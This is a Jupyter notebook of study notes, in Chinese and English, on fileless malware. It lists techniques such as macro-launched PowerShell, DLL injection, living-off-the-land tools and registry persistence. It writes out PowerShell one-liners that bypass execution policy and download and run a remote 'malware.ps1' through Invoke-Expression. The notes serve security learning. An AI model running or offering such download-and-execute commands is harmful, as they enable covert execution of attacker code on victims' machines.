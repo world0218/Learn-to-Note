{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ***學習筆記*** - Fileless Malware\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Definition\n",
    "\n",
    "* A type of stealth attack that evades detection by most security solutions and frustrates forensic analysis efforts.\n",
    "* Without being stored in a file or installed directly on a machine, fileless inflection go straight into memmory and the malicious content never touches hard drive.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Methods\n",
    "1.  經由文件漏洞啟動惡意巨集腳本 \n",
    "> EX：經由JavaScript或VisualBasic(VBA) 加入惡意腳本至 -> Office文件, PDF檔案, -> 執行PowerShell工具 \n",
    "2.  記憶體漏洞攻擊 --> 利用 PowerShell,PsExec,WMI 將惡意程式碼注入正常程序以躲避偵測 \n",
    "> 常見手法 ：Reflective DLL 注入 , EternalBlue \n",
    "3.  使用腳本安裝惡意程式\n",
    "> 使用PowerShell這類工具的腳本語言執行各種程式碼 如：KOVTER, POWMET, FAREIT\n",
    "4.  利用系統管理工具來安裝惡意程式\n",
    ">* 利用系統內建管理工具 如：WMIC 和 CertUtil正常的系統工具安裝資訊竊取程式\n",
    ">* 利用regsvr32這類指令工具載入執行惡意DLL\n",
    "5.  利用無檔案式技巧躲藏在系統內部\n",
    "> 藉由將程式碼儲存在Windows系統登錄檔中，就能在系統重新開機時自動環元並執行其程式"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 利用PowerShell來執行惡意script"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**command line uses the DownloadString method to download content from remote location**\n",
    ">powershell.exe -ep Bypass -nop -noexit -c iex ((New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′))\n",
    "\n",
    "**'ByPass'** parameter is to bypass execution policies so that administrators can remotely execute commands, attackers can also use to bypass security."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "PowerShell Get-Content can access the contentof a .ps2 malware script and pass it to Invoke-Expression for execution\n",
    ">powershell.exe –ep Bypass “& {Get-Content .\\malware.ps2 | iex}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Invoke-Expression (iex) 使用"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "PowerShell module called **'Invoked-Expression'** allows us to execute strings\n",
    "\n",
    "1. If we're getting the script from the website or a webserver, we can do something like this：\n",
    "> $url = 'https://[website]/malware.ps1'\n",
    "\n",
    "> iex ((New ObjectNet.WebClient).DownloadString($url))\n",
    "\n",
    "2. If we're getting the script from a file hosted on an SMB server, USB (Ducky/BB) or outside sourse, we can do something like this：\n",
    "\n",
    "> iex (Get-Content pathtoscript\\script1.txt)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***This is a security issue since the iex cmdlet opens up the script to injection attacks.***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**外部連結**\n",
    "\n",
    "    McAfee-What is Fileless Malware?\n",
    "   * https://www.mcafee.com/enterprise/en-us/security-awareness/ransomware/what-is-fileless-malware.html\n",
    "\n",
    "    資安趨勢部落格\n",
    "   * https://blog.trendmicro.com.tw/?p=58512\n",
    "\n",
    "    McAfee-Fileless Malware Execution with PowerShell is Easier than you may realize\n",
    "   * https://www.mcafee.com/blogs/enterprise/fileless-malware-execution-with-powershell-is-easier-than-you-may-realize/\n",
    "   \n",
    "    Running Powershell in memory\n",
    "   * https://forums.hak5.org/topic/41729-running-powershell-in-memory/"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
